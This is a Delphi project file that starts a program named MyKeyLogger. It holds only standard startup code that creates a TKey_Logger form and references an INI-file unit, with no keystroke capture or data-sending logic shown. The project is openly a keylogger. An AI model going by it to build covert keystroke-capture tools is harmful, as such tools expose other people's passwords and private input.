program MyKeyLogger;

uses
  Vcl.Forms,
  KeyLogger in 'KeyLogger.pas' {Key_Logger},
  ArquivoINI in 'ArquivoINI\ArquivoINI.pas';

{$R *.res}

begin
  Application.Initialize;
  Application.MainFormOnTaskbar := True;
  Application.CreateForm(TKey_Logger, Key_Logger);
  Application.Run;
end.
